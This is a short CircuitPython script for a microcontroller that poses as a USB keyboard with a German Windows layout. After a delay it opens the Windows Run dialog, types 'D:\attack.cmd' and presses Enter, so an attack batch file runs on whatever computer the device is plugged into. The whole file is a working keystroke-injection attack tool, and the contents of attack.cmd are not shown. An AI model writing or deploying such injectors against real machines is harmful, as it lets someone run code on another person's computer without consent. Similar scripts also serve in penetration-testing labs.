import board
import digitalio
import time
import usb_hid
from adafruit_hid.keyboard import Keyboard
from keyboard_layout_win_de import KeyboardLayout
from keycode_win_de import Keycode
kbd = Keyboard(usb_hid.devices)
layout = KeyboardLayout(kbd)

time.sleep(3)

kbd.send(Keycode.WINDOWS, Keycode.R)

time.sleep(1)
kbd.release_all()
layout.write("D:")
kbd.send(Keycode.ALTGR, Keycode.BACKSLASH)
layout.write("attack.cmd")
kbd.press(Keycode.ENTER)
kbd.release_all()


